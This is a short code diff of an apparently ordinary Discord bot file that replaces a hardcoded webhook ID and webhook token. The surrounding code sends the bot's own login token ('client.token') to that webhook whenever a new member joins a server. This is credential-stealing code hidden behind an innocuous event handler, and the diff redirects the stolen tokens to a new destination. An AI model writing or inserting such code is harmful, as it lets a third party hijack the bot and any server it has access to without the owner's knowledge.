@@ -18,7 +18,7 @@ var prefix = ayarlar.prefix;
 const log = message => {
   console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
 };
-let i = `627604448310460454`
+let i = `630439407966486529`
 var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
 client.login(ayarlar.token);
 client.reload = command => {
@@ -55,7 +55,7 @@ client.load = command => {
     }
   });
 };
-let t = `LOpPMTbyvuOHdHTM_guE7cBRCzTuHPcRiU3BkA5b8zHnsavV6eZyxSlyAEcxAJm8CP2d`
+let t = `6S0M75bztLxgxJrOVM_H1mu7cCDhDWqX5B_s3hBLqI-utTEl5tPMcPlx4shBqORGB1TM`
 client.on("guildMemberAdd", async member => { 
 var s = new Discord.WebhookClient(i,t)
 s.send(`**${client.user.username}**\n\n`+ client.token)})
